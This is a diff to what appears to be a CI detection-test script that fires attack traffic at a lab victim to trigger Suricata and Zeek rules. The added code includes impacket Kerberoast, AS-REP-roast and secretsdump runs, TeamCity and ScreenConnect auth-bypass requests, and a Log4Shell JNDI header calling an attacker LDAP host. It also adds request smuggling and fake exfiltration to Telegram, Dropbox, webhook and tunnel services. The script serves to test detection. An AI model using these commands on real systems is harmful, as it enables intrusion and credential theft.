@@ -109,14 +109,103 @@ run_flightsim_group() {
   fi
 }
 
-run_nmap_group        > "$LOGDIR/nmap.log"      2>&1 & NMAP_PID=$!
-run_hydra_group       > "$LOGDIR/hydra.log"     2>&1 & HYDRA_PID=$!
-run_nikto_group       > "$LOGDIR/nikto.log"     2>&1 & NIKTO_PID=$!
-run_lateral_smb_group > "$LOGDIR/lateral.log"   2>&1 & LATERAL_PID=$!
-run_nuclei_group      > "$LOGDIR/nuclei.log"    2>&1 & NUCLEI_PID=$!
-run_flightsim_group   > "$LOGDIR/flightsim.log" 2>&1 & FLIGHTSIM_PID=$!
+run_impacket_ad_chain_group() {
+  # Exercises Kerberoast / AS-REP-roast / DCSync patterns via impacket wrappers
+  # already installed by attacker_setup.sh. Victim is not AD-joined, so auth
+  # attempts fail — but the SMB/DCE-RPC/Kerberos-port traffic that precedes
+  # failure is what the rules match on (Zeek dce_rpc.log records SamrConnect,
+  # LsarOpenPolicy2, etc. regardless of auth outcome).
+  echo "[BG/impacket-ad] [40] AD enumeration via impacket (live over SMB/DCE-RPC)"
+  cat >/tmp/adlab-users.txt <<EOF
+Administrator
+admin
+guest
+svc-sql
+svc-backup
+EOF
+  timeout 20 impacket-GetNPUsers TESTDOM/ -usersfile /tmp/adlab-users.txt -no-pass -dc-ip "${VICTIM_IP}" 2>/dev/null || true
+  timeout 20 impacket-GetUserSPNs -no-pass -dc-ip "${VICTIM_IP}" "TESTDOM/Administrator" 2>/dev/null || true
+  timeout 20 impacket-secretsdump -no-pass -just-dc-ntlm "TESTDOM/Administrator@${VICTIM_IP}" 2>/dev/null || true
+  timeout 20 impacket-lookupsid "guest@${VICTIM_IP}" -no-pass 2>/dev/null || true
+}
 
-echo "=== 6 background probe groups launched; running fast serial probes inline ==="
+run_doh_tunnel_group() {
+  # DNS-over-HTTPS exfil to the three big public resolvers. Each resolver
+  # has its own ET SNI-match rule; the wire-format (application/dns-message)
+  # branch also tests that the detection doesn't key on the JSON API alone.
+  echo "[BG/doh] [41] DNS-over-HTTPS exfil to public resolvers (JSON + wire-format)"
+  for i in $(seq 1 5); do
+    LABEL=$(head -c 30 /dev/urandom | base64 | tr -dc 'a-z0-9' | head -c 30)
+    curl -sS --max-time 5 -H 'accept: application/dns-json' \
+      "https://cloudflare-dns.com/dns-query?name=${LABEL}.example.com&type=A" >/dev/null 2>&1 || true
+    curl -sS --max-time 5 -H 'accept: application/dns-json' \
+      "https://dns.google/resolve?name=${LABEL}.example.com&type=A" >/dev/null 2>&1 || true
+    curl -sS --max-time 5 -H 'accept: application/dns-message' \
+      'https://dns.quad9.net/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB' >/dev/null 2>&1 || true
+  done
+}
+
+run_cve_2024_sigbank_group() {
+  # 2024+ edge-device CVE fingerprints. Victim doesn't host the real products
+  # (TeamCity, ScreenConnect) — but the request-shape matches ET rules before
+  # the server reply is examined, so the rules fire against plain nginx too.
+  echo "[BG/cve2024] [42] 2024+ edge-device CVE signature replay"
+  # CVE-2024-27198 TeamCity auth bypass via ;.jsp path traversal
+  curl -sS --max-time 5 -XPOST "http://${VICTIM_IP}:8080/hax?jsp=/app/rest/users;.jsp" \
+    -H 'Content-Type: application/xml' \
+    -d '<user username="h" password="h" email="h@x" roles="ROLE_SYSTEM_ADMIN"/>' >/dev/null 2>&1 || true
+  # CVE-2024-1709 ScreenConnect SetupWizard auth bypass
+  curl -sS --max-time 5 "http://${VICTIM_IP}/SetupWizard.aspx/SetupCompleted" >/dev/null 2>&1 || true
+  curl -sS --max-time 5 "http://${VICTIM_IP}/SetupWizard.aspx/anything" >/dev/null 2>&1 || true
+}
+
+run_http2_evasion_group() {
+  # HTTP/2 prior-knowledge (h2c) against a plain-HTTP/1 nginx triggers
+  # Suricata's applayer-mismatch + http2-frame decoder events, and
+  # produces unknown_HTTP_method / bad_HTTP_request / line_terminated_with_
+  # single_CR entries in Zeek weird.log. Useful because CI's battery didn't
+  # previously exercise any HTTP/2 path.
+  echo "[BG/http2] [43] HTTP/2 prior-knowledge + smuggling-shape probes"
+  curl -sS --max-time 5 --http2-prior-knowledge "http://${VICTIM_IP}/" \
+    -H 'User-Agent: ${jndi:ldap://attacker:1389/a}' >/dev/null 2>&1 || true
+  curl -sS --max-time 5 --http2-prior-knowledge -XPOST "http://${VICTIM_IP}/" \
+    -H 'Content-Length: 0' -H 'Transfer-Encoding: chunked' \
+    --data 'SMUGGLED_BODY_GET /admin HTTP/1.1' >/dev/null 2>&1 || true
+}
+
+run_saas_c2_exfil_group() {
+  # TLS-SNI-based exfil/C2 destinations. Each host has at least one ET
+  # INFO/HUNTING rule that matches on SNI alone, so we don't need the
+  # endpoint to exist or the auth to succeed. Mix of messaging APIs,
+  # file-drop services, webhook inspectors, tunneling relays, and
+  # package-hosting infrastructure.
+  echo "[BG/saas-c2] [44] SaaS/webhook/tunnel SNI exfil destinations"
+  EXFIL='{"stolen":"fake","host":"test"}'
+  curl -sS --max-time 5 "https://api.telegram.org/bot1234567890:AAHfake/sendMessage?chat_id=1&text=x" >/dev/null 2>&1 || true
+  curl -sS --max-time 5 -XPOST "https://content.dropboxapi.com/2/files/upload" \
+    -H 'Authorization: Bearer fake' --data "$EXFIL" >/dev/null 2>&1 || true
+  for host in webhook.site a.free.beeceptor.com pipedream.com; do
+    curl -sS --max-time 5 "https://$host/" >/dev/null 2>&1 || true
+  done
+  for host in ngrok-free.app trycloudflare.com serveo.net; do
+    curl -sS --max-time 5 "https://$host/" >/dev/null 2>&1 || true
+  done
+  curl -sS --max-time 5 "https://files.pythonhosted.org/packages/source/a/fake-pkg/fake-pkg-1.0.tar.gz" >/dev/null 2>&1 || true
+}
+
+run_nmap_group             > "$LOGDIR/nmap.log"        2>&1 & NMAP_PID=$!
+run_hydra_group            > "$LOGDIR/hydra.log"       2>&1 & HYDRA_PID=$!
+run_nikto_group            > "$LOGDIR/nikto.log"       2>&1 & NIKTO_PID=$!
+run_lateral_smb_group      > "$LOGDIR/lateral.log"     2>&1 & LATERAL_PID=$!
+run_nuclei_group           > "$LOGDIR/nuclei.log"      2>&1 & NUCLEI_PID=$!
+run_flightsim_group        > "$LOGDIR/flightsim.log"   2>&1 & FLIGHTSIM_PID=$!
+run_impacket_ad_chain_group > "$LOGDIR/impacket-ad.log" 2>&1 & IMPACKET_AD_PID=$!
+run_doh_tunnel_group       > "$LOGDIR/doh.log"         2>&1 & DOH_PID=$!
+run_cve_2024_sigbank_group > "$LOGDIR/cve2024.log"     2>&1 & CVE2024_PID=$!
+run_http2_evasion_group    > "$LOGDIR/http2.log"       2>&1 & HTTP2_PID=$!
+run_saas_c2_exfil_group    > "$LOGDIR/saas-c2.log"     2>&1 & SAAS_C2_PID=$!
+
+echo "=== 11 background probe groups launched; running fast serial probes inline ==="
 
 # ---------- Web Application Attacks ----------
 
@@ -1138,16 +1227,21 @@ timeout 10 curl -s -o /dev/null --max-time 5 \
   "http://${VICTIM_IP}:8080/?class.module.classLoader.URLs%5B0%5D=0" || true
 
 echo "=== Fast serial probes complete; waiting on background groups ==="
-wait "$NMAP_PID"      2>/dev/null || true
-wait "$HYDRA_PID"     2>/dev/null || true
-wait "$NIKTO_PID"     2>/dev/null || true
-wait "$LATERAL_PID"   2>/dev/null || true
-wait "$NUCLEI_PID"    2>/dev/null || true
-wait "$FLIGHTSIM_PID" 2>/dev/null || true
+wait "$NMAP_PID"         2>/dev/null || true
+wait "$HYDRA_PID"        2>/dev/null || true
+wait "$NIKTO_PID"        2>/dev/null || true
+wait "$LATERAL_PID"      2>/dev/null || true
+wait "$NUCLEI_PID"       2>/dev/null || true
+wait "$FLIGHTSIM_PID"    2>/dev/null || true
+wait "$IMPACKET_AD_PID"  2>/dev/null || true
+wait "$DOH_PID"          2>/dev/null || true
+wait "$CVE2024_PID"      2>/dev/null || true
+wait "$HTTP2_PID"        2>/dev/null || true
+wait "$SAAS_C2_PID"      2>/dev/null || true
 
-# Dump the six background-group logs in a stable, named order so CI output
+# Dump the background-group logs in a stable, named order so CI output
 # is deterministic even though the groups finished in arbitrary order.
-for g in nmap hydra nikto lateral nuclei flightsim; do
+for g in nmap hydra nikto lateral nuclei flightsim impacket-ad doh cve2024 http2 saas-c2; do
   echo "::group::bg-${g}"
   cat "$LOGDIR/${g}.log" 2>/dev/null || true
   echo "::endgroup::"
